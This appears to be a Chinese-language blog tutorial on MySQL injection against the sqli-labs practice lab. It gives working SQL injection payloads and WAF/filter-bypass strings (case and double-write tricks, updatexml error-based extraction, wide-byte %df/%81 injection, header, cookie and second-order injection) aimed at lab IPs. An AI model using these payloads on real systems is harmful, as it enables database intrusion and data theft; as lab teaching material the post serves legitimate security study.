---
title:      "关于Mysql注入(二)"
date:       2020-03-16 08:00:00
categories: 信息安全
excerpt_separator: <!--more-->
latex: true
tags:
    - sql_injection
    - 绕过检测
---
## <center>基于sqli_lab的sql注入详解(二)</center>
<!--more-->


## SQL注入绕过

### 大小写绕过
> 程序中设置了过滤关键字，但没有对关键字组成深入分析过滤，可以通过修改关键字内字母大小写来绕过过滤措施。  
> 如：AnD 1=1 （将某些字母大写）

### 双写绕过
> 在程序中设置出现关键字之后替换为空，可以双写绕过
> uniunionOn(也可结合大小写绕过使用)

### 编码绕过
>利用URL编码绕过过滤机制

### 内联注释绕过

```sql
/*!select * from admin*/;
```

***
## POST基于时间的盲注
### 以less-15为例
![f2]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f2.png)

### 输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果
![f1]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f1.png)

***
## POST基于布尔的盲注
### 还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg
![f3]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f3.png)  
![f4]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f4.png)

***
## HTTP头中的SQL注入
### 产生原理
> 看一下源码  
> ![f5]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f5.png)  
> ![f6]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f6.png)  
> 未对HTTP头的变量过滤，导致注入漏洞产生
> 可以在参数最后加入\，测试漏洞是否存在

![f9]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f9.png)   
![f10]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f10.png) 

### 利用一个报错函数updatexml构造payload

```http
' and updatexml(1,concat(0x3a,(select version()),0x3a),1) or '1'='1
```

![f7]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f7.png)   
![f8]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f8.png)   

***
## Cookie注入
### 以less-20为例，首先抓到HTTP包，然后进行重定向
![f11]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f11.png)  

### 然后将包forward，抓到含有cookie注入漏洞的包
![f12]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f12.png)   

### 构造Payload
![f13]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f13.png)

***
## 绕过去除注释符的sql注入
### 以less-23为例，可以看到对id参数进行了去除注释符的过滤
![f14]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f14.png)  

### 可以通过or '1'='1  的方式去闭合右边的引号部分，从而达到绕过效果

```http
http://192.168.0.104/sqli/Less-23/?id=-1' union select 1,database(),'3
```

### 返回结果
![f15]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f15.png)  

***
## 绕过过滤and和or的注入
### 对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{\&\&}$,$\color{red}{or}$ 和 $\color{red}{\|}$

### 以less-25为例
![f16]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f16.png)   

### 改变大小写发现无效

```http
http://192.168.0.104/sqli/Less-25/?id=1'  And 1=1--+
```

![f17]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f17.png)

### 双写绕过和||都可以

```http
http://192.168.0.104/sqli/Less-25/?id=1'  || 1=1--+
http://192.168.0.104/sqli/Less-25/?id=1'  anandd 1=1--+
```

![f18]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f18.png)

***
## 绕过去除空格的注入
### 以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等
![f19]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f19.png)

```http
http://192.168.0.104/sqli/Less-26/?id=1'%20||'1
```
![f20]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f20.png)

***
## 宽字节注入
### 产生原理
> GBK每个字符2个字节，ASCII每个字符1个字节
> PHP中编码为GBK，函数执行为ASCII，mysql默认字符集是GBK等宽字节字符集  
> %DF'会被PHP中的$\color{red}{addslashes}$函数转义为“%DF\\'”,"\\"是URL里的“%5C”,那么“%DF'”会被转义成“%DF%5C%27”(%27是引号)，倘若网站字符集是GBK，Mysql使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符

### 以less-33为例
![f21]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f21.png)

### 构造Payload

```http
http://192.168.0.100/sqli/less-33/?id=-1%df' union select 1,version(),database() --+
```

![f22]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f22.png)

> 最常用的是使用%df，其实只要第一个ASCII码大于128即可，如ASCII码为129的就可以，先将129转化为16进制，0x81，然后在前面加%即可，即为%81  
> GBK首字节对应0x81-0xfe，尾字节对应0x40-0xfe(除0x7f)

### 如less-32
![f23]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f23.png)   

```http
http://192.168.0.100/sqli/less-32/?id=-1%81' union select 1,version(),database() --+
```

![f24]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f24.png)   


***
## 二次注入
### 以less-24为例，没有对username变量进行过滤
![f29]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f29.png)

### 攻击过程
![f25]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f25.png)  
![f26]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f26.png)  
![f27]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f27.png)   
![f28]({{site.baseurl}}/assets/images/images_of_sql_injection/mysql_injection2_f28.png) 